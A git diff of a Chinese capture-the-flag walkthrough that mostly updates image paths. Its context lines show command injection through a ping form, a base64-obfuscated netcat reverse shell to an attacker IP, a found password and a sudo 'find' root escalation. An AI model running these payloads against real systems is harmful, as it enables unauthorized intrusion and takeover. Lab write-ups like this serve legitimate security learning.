@@ -24,7 +24,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
 
 访问80端口，但是无法执行ping命令。
 
-![image-20220914122855710](../../.gitbook/assets/image-20220914122855710-1675840113275948.png)
+![image-20220914122855710](../../.gitbook/assets/image-20220914122855710.png)
 
 爆破目录，找到：`/superadmin.php `
 
@@ -63,11 +63,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 访问：`/superadmin.php `
 
-![image-20220914123259003](../../.gitbook/assets/image-20220914123259003-1675840113275949.png)
+![image-20220914123259003](../../.gitbook/assets/image-20220914123259003.png)
 
 执行命令
 
-![image-20220914123334005](../../.gitbook/assets/image-20220914123334005-1675840113275950.png)
+![image-20220914123334005](../../.gitbook/assets/image-20220914123334005.png)
 
 查看`superadmin.php`源码，开源发现有些命令会被过滤。
 
@@ -111,11 +111,11 @@ bmMudHJhZGl0aW9uYWwgIC1lIC9iaW4vYmFzaCAxOTIuMTY4LjMyLjUgMTIzNDUK
 ping 127.0.0.1 | `echo "bmMudHJhZGl0aW9uYWwgIC1lIC9iaW4vYmFzaCAxOTIuMTY4LjMyLjUgMTIzNDUK=" | base64 -d`
 ```
 
-![image-20220914124215641](../../.gitbook/assets/image-20220914124215641-1675840113275951.png)
+![image-20220914124215641](../../.gitbook/assets/image-20220914124215641.png)
 
 有隐藏文件
 
-![image-20220914133210504](../../.gitbook/assets/image-20220914133210504-1675840113275952.png)
+![image-20220914133210504](../../.gitbook/assets/image-20220914133210504.png)
 
 找属于yash用户的文件
 
@@ -147,7 +147,7 @@ Password: haclabs1234
 
 查看sudo列表
 
-![image-20220914133509818](../../.gitbook/assets/image-20220914133509818-1675840113275953.png)
+![image-20220914133509818](../../.gitbook/assets/image-20220914133509818.png)
 
 sudo提权
 
@@ -155,4 +155,4 @@ sudo提权
 sudo -u root find . -exec /bin/bash \; -quit
 ```
 
-![image-20230208150840891](../../.gitbook/assets/image-20230208150840891.png)
+![image-20230208154353306](../../.gitbook/assets/image-20230208154353306.png)
